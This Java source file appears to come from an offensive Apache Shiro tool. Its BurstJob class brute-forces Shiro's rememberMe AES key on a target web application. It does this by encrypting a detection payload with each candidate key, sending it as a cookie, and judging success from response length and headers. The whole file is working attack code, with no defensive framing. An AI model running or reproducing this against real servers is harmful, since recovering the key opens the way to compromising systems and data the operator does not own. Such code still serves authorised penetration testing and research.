package cn.safe6.core;

import cn.safe6.Controller;
import cn.safe6.util.HttpClientUtil;
import cn.safe6.util.PayloadEncryptTool;
import cn.safe6.util.ShiroTool;
import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang3.*;
import javafx.application.Platform;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.util.EntityUtils;


import java.util.*;
import java.util.concurrent.Callable;

/**
 *  爆破key
 */

public class BurstJob implements Callable<String> {
    private String url;
    private String method;
    private Map<String,Object> params;
    private List<String> keys;
    final private Controller controller = (Controller) ControllersFactory.controllers.get(Controller.class.getSimpleName());
    final private Map<String,Object> paramsContext = ControllersFactory.paramsContext;


    public BurstJob(String url, String method, Map<String,Object> params, List<String> keys) {
        this.url = url;
        this.method = method;
        this.params = params;
        this.keys = keys;
    }

    @Override
    public String call() {

        //是否用post提交
        boolean isPost = false;
        //默认错误长度
        int errLen = 0;
        //默认存在 remember
        boolean isExistMB =true;

        try {
            Controller.logUtil.printInfoLog("开始爆破默认key");

            //错误包长度
            Map<String, Object> header = (Map<String, Object>)paramsContext.get("header");
            if (header==null){
                header = new HashMap<>();
            }
            Object oldCookie = null;
            //在原有cookie后面追加
            if (header.get("cookie")!=null){
                oldCookie = header.get("cookie");
                if (!header.get("cookie").toString().contains(paramsContext.get("rmeValue").toString())){
                    header.put("cookie",oldCookie+";"+paramsContext.get("rmeValue")+"=123456");
                }
            }else {
                header.put("cookie",paramsContext.get("rmeValue")+"=123456");
            }



            if(paramsContext.get("method").equals(Constants.METHOD_GET)){
                CloseableHttpResponse response = HttpClientUtil.httpGetRequest3(url,header);
                if (response!=null){
                   String data = EntityUtils.toString(response.getEntity(),"utf-8");
                   errLen = data.length();
                   if (!Arrays.toString(response.getAllHeaders()).contains(paramsContext.get("rmeValue").toString())){
                       isExistMB = false;
                   }
                }

            }else {
                isPost = true;
                CloseableHttpResponse response = HttpClientUtil.httpPostRequest2(url,header,params);
                if (response!=null){
                    String data = EntityUtils.toString(response.getEntity(),"utf-8");
                    errLen = data.length();
                    if (!Arrays.toString(response.getAllHeaders()).contains(paramsContext.get("rmeValue").toString())){
                        isExistMB = false;
                    }
                }

            }


            int i=1;
            for (String key : keys) {
                Controller.logUtil.printInfoLog(i+".检测"+key);
                String encryptData="";
                if (paramsContext.get("AES").equals(Constants.AES_GCM)){
                    encryptData = PayloadEncryptTool.AesGcmEncrypt(ShiroTool.getDetectText(),key);
                }else {
                    encryptData = PayloadEncryptTool.AesCbcEncrypt(ShiroTool.getDetectText(),key);
                }

                if (controller.isShowPayload.isSelected()){
                    Controller.logUtil.printInfoLog(encryptData);
                    Controller.logUtil.printInfoLog(encryptData.length()+"");
                }
                //请求包header超过8k会报header too large错误
                if (oldCookie!=null){
                    header.put("cookie",oldCookie+";"+paramsContext.get("rmeValue")+"="+encryptData);
                }else {
                    header.put("cookie",paramsContext.get("rmeValue")+"="+encryptData);
                }

                //System.out.println(header.get("cookie"));
                String data = null;
                CloseableHttpResponse response;
                String resHeader="";
                if(!isPost){
                    response = HttpClientUtil.httpGetRequest3(url,header);
                    if (response!=null){
                        resHeader = Arrays.toString(response.getAllHeaders());
                        data = EntityUtils.toString(response.getEntity(),"utf-8");
                    }
                }else {
                    response = HttpClientUtil.httpPostRequest2(url,header,params);
                    if (response!=null){
                        resHeader = Arrays.toString(response.getAllHeaders());
                        data = EntityUtils.toString(response.getEntity(),"utf-8");
                    }
                }
                //用长度进行第一次判断
                if (data!=null&&errLen!=data.length()){
                    if (isExistMB&&resHeader.contains(paramsContext.get("rmeValue").toString())){
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        controller.aesKey.setText(key);
                        break;
                    }else {
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        controller.aesKey.setText(key);
                        break;
                    }
                }else {
                    if (isExistMB&&!resHeader.contains(paramsContext.get("rmeValue").toString())){
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        controller.aesKey.setText(key);
                        break;
                    }
                    Controller.logUtil.printAbortedLog("秘钥错误");
                }
                i++;
            }
            Controller.logUtil.printAbortedLog("爆破结束！未发现默认秘钥！");
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            //Controller.logUtil.getLog().selectPositionCaret(controller.log.getText().length());
            Platform.runLater(() -> {
                controller.burstKey.setDisable(false);
            });
        }
        return "";
    }



    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getMethod() {
        return method;
    }

    public void setMethod(String method) {
        this.method = method;
    }

    public Map<String, Object> getParams() {
        return params;
    }

    public void setParams(Map<String, Object> params) {
        this.params = params;
    }

    public List<String> getKeys() {
        return keys;
    }

    public void setKeys(List<String> keys) {
        this.keys = keys;
    }


}
